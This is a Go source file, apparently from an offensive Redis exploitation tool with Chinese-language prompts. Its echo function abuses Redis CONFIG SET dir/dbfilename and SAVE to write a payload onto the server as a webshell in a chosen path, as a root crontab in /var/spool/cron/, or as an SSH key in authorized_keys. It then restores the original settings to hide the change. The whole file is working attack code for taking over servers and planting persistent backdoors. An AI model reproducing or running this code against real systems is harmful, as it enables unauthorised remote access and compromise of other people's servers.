package pkg

import (
	"context"
	"fmt"
	"strings"
	"time"
)

func echo(flag, path string) {
	var dir, dbfilename, webshell string
	var save, helloWebShell = "save", "helloWebShell"

	switch flag {
	case "getshell":
		fmt.Print("设置保存的路径: ")
		fmt.Scanln(&dir)
		dir = fmt.Sprintf("config set dir %s", dir)

		fmt.Print("设置保存的文件名：")
		fmt.Scanln(&dbfilename)
		dbfilename = fmt.Sprintf("config set dbfilename %s", dbfilename)

		Info("读取 " + path)
		webshell = fmt.Sprintf("\n\n\n%s\n\n", readExp(path))

	case "crontab":
		dir = "config set dir /var/spool/cron/"
		dbfilename = "config set dbfilename root"
		Info("读取 " + path)
		webshell = fmt.Sprintf("\n\n\n%s\n\n", readExp(path))

	case "ssh":
		fmt.Print("设置Linux用户名: ")
		fmt.Scanln(&dir)

		if strings.EqualFold(dir, "root") {
			dir = fmt.Sprintf("config set dir /%s/.ssh/", dir)
		} else if strings.Contains(dir, "/"){
			dir = fmt.Sprintf("config set dir %s", dir)
		} else {
			dir = fmt.Sprintf("config set dir /home/%s/.ssh/", dir)
		}

		dbfilename = "config set dbfilename authorized_keys"
		Info("读取 " + path)
		webshell = fmt.Sprintf("\n\n%s\n\n", readExp(path))
	}

	Info(dir)
	Success(RedisCmd(dir))

	Info(dbfilename)
	Success(RedisCmd(dbfilename))

	Info(webshell)
	ctx := context.Background()
	err := Rdb.Set(ctx, helloWebShell, webshell, time.Minute*2).Err()
	if err != nil {
		Err(err)
	}

	Info(save)
	Success(RedisCmd(save))

	Info("del " + helloWebShell)
	Success(RedisCmd("del " + helloWebShell))

	dir2 := fmt.Sprintf("config set dir %v", redisDir)
	Info(dir2)
	Success(RedisCmd(dir2))

	db := fmt.Sprintf("config set dbfilename %v", redisDbFilename)
	Info(db)
	Success(RedisCmd(db))

	Info(save)
	Success(RedisCmd(save))

}
